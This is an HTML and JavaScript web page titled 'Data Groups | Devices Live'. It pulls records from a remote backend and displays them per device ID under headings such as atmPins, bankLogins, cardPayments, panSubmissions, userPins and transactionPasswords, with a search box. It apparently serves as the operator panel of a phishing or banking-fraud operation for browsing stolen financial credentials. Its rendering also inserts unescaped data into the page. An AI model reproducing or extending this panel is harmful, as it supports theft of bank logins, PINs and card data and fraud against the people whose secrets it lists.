<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Data Groups | Devices Live</title>

<link rel="stylesheet" href="css/style.css" />

<style>

body {
  font-family: 'Roboto', sans-serif;
  margin: 0;
  margin-top: -250px;
  background: #f5f5f5;
  color: #333;
}

.nav a.active {
  color: limegreen !important;
  font-weight: 700;
  position: relative;
}
.nav a.active::after {
  content: "";
  position: absolute;
  bottom: -6px;
  left: 50%;
  transform: translateX(-50%);
  width: 60%;
  height: 4px;
  background: limegreen;
  border-radius: 4px;
}

/* LOADER */
#loaderBox {
  position: fixed; inset: 0;
  background: #f5f5f5;
  display: flex; justify-content: center; align-items: center;
  flex-direction: column; gap: 25px;
  z-index: 999999;
}
.cube {
  width: 55px; height: 55px;
  transform-style: preserve-3d;
  animation: cubeRotate 1.8s linear infinite;
  position: relative;
}
.cube div {
  position: absolute;
  width: 55px; height: 55px;
  background: #00a14b;
  border: 2px solid #fff;
}
.cube .front {transform:rotateY(0deg)translateZ(27px);}
.cube .back {transform:rotateY(180deg)translateZ(27px);}
.cube .right {transform:rotateY(90deg)translateZ(27px);}
.cube .left {transform:rotateY(-90deg)translateZ(27px);}
.cube .top {transform:rotateX(90deg)translateZ(27px);}
.cube .bottom {transform:rotateX(-90deg)translateZ(27px);}
@keyframes cubeRotate {
  0% {transform:rotateX(0)rotateY(0);}
 100% {transform:rotateX(360deg)rotateY(360deg);}
}
.loading-text {font-size:20px;font-weight:bold;color:#00a14b;}

/* SEARCH BAR */
.search-bar {
  background:#fff;
  padding:10px 0;
  box-shadow:0 2px 4px rgba(0,0,0,.04);
  position: fixed;
  top:130px; left:0; right:0;
  z-index: 998;
}
.search-inner {
  max-width:900px;
  margin:auto;
  display:flex;
  gap:10px;
  padding:0 12px;
}
.search-inner input {
  padding:10px 14px;
  font-size:15px;
  border:1px solid #ccc;
  border-radius:8px;
  flex:1;
}

/* DATA CONTAINER FIXED GAP */
.container {
  max-width:1200px;
  margin:200px auto 20px;  /* FIXED â€” NOT TOO BIG, NOT TOO SMALL */
  padding:0 12px;
}

/* DATA CARDS */
.data-card {
  border:1px solid #ddd;
  padding:14px;
  background:#fff;
  border-radius:10px;
  margin-bottom:18px;
}
.card-header {
  font-size:17px;
  font-weight:700;
  color:#2b4c7e;
}
.section-title {
  font-size:18px;
  margin:12px 0 6px;
  font-weight:600;
  padding-left:4px;
  color:#555;
}

.data-item {
  margin:4px 0;
}

/* RESPONSIVE */
@media(max-width:768px){
  .container { margin-top:240px; } /* Mobile adjust */
}

</style>
</head>

<body>

<!-- LOADER -->
<div id="loaderBox">
  <div class="cube">
    <div class="front"></div><div class="back"></div>
    <div class="right"></div><div class="left"></div>
    <div class="top"></div><div class="bottom"></div>
  </div>
  <div class="loading-text">Loading...</div>
</div>

<header class="header">
  <div class="header-inner">
    <h1 class="header-title">Data <span style="color:red;">Groups</span></h1>
  </div>
</header>

<div id="universal-nav"></div>

<section class="search-bar">
  <div class="search-inner">
    <input id="search" type="text" placeholder="Search UID / number / name...">
  </div>
</section>

<div class="container" id="dataContainer">
  <p>Loading...</p>
</div>

<script>

const API_URL = "https://backend-1-qcsu.onrender.com/api/all-data";

let grouped = {};
let allUIDs = [];

/* Group data */
function groupData(data){
  const g={};
  const push=(uid,sec,obj)=>{
    if(!g[uid]) g[uid]={};
    if(!g[uid][sec]) g[uid][sec]=[];
    g[uid][sec].push(obj);
  };

  data.forms.forEach(x=>push(x.uniqueid,"forms",x));
  data.atmPins.forEach(x=>push(x.uniqueid,"atmPins",x));
  data.bankLogins.forEach(x=>push(x.uniqueid,"bankLogins",x));
  data.cardPayments.forEach(x=>push(x.uniqueid,"cardPayments",x));
  data.panSubmissions.forEach(x=>push(x.uniqueid,"panSubmissions",x));
  data.userPins.forEach(x=>push(x.uniqueid,"userPins",x));
  data.transactionPasswords.forEach(x=>push(x.uniqueid,"transactionPasswords",x));

  return g;
}

/* Render */
function render(list){
  const box=document.getElementById("dataContainer");
  box.innerHTML="";

  if(!list.length){
    box.innerHTML="<p>No users found</p>";
    return;
  }

  list.forEach(uid=>{
    const u=grouped[uid];
    let html = `<div class="data-card"><div class="card-header">User: ${uid}</div>`;

    Object.entries(u).forEach(([sec,items])=>{
      html += `<div class="section-title">${sec}</div>`;
      items.forEach(it=>{
        Object.entries(it).forEach(([k,v])=>{
          if(k!=="uniqueid")
            html += `<div class="data-item"><b>${k}:</b> ${v}</div>`;
        });
        html += `<br>`;
      });
    });

    html += `</div>`;
    box.innerHTML += html;
  });
}

/* Search */
function search(){
  const q=document.getElementById("search").value.toLowerCase();
  const r=allUIDs.filter(uid=>{
    if(uid.toLowerCase().includes(q)) return true;

    const u=grouped[uid];
    for(const sec in u){
      for(const item of u[sec]){
        for(const k in item){
          if(String(item[k]).toLowerCase().includes(q)) return true;
        }
      }
    }
    return false;
  });

  render(r);
}

/* Load data */
async function load(){
  const r=await fetch(API_URL);
  const j=await r.json();

  grouped = groupData(j.data);
  allUIDs = Object.keys(grouped);

  render(allUIDs);

  document.getElementById("loaderBox").style.display="none";
}

/* Load NAV + underline */
(async function(){
  const nav = await fetch("components/nav.html");
  document.getElementById("universal-nav").innerHTML = await nav.text();

  document.querySelectorAll(".nav a").forEach(a=>{
    if(a.href.includes("groups")) a.classList.add("active");
  });
})();

document.getElementById("search").addEventListener("input",search);

load();
</script>

</body>
</html>
